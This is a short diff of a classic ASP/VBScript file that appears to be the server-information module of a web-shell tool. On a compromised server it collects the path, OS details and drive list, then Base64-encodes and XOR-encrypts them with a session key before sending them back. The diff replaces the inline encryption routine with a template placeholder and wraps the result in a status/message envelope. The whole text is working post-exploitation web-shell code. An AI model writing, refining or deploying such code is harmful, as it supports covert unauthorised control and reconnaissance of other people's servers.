@@ -2,14 +2,7 @@ dim basicInfo,driveList,currentPath,osInfo
 currentPath=Server.MapPath(".")
 osInfo=request.servervariables("os")
 
-Function Encrypt(data)
-key=Session("k")
-size=len(data)
-For i=1 To size
-encryptResult=encryptResult&chrb(asc(mid(data,i,1)) Xor Asc(Mid(key,(i and 15)+1,1)))
-Next
-Encrypt=encryptResult
-End Function
+__Encrypt__
 
 Function Base64Encode(sText)
     Dim oXML, oNode
@@ -207,6 +200,7 @@ Sub main(arrArgs)
 		Set TheDrive=Nothing
 		Set Fso=Nothing
 		finalResult="{""basicInfo"":"""&Base64Encode(basicInfo)&""",""driveList"":"""&Base64Encode(driveList)&""",""arch"":"" "",""currentPath"":"""&Base64Encode(currentPath)&""",""osInfo"":"""&Base64Encode(osInfo)&"""}"
+		finalResult="{""status"":"""&Base64Encode("success")&""",""msg"":"""&Base64Encode(finalResult)&"""}"
 		Response.binarywrite(Encrypt(finalResult))
 		'Response.write(finalResult)
 End Sub
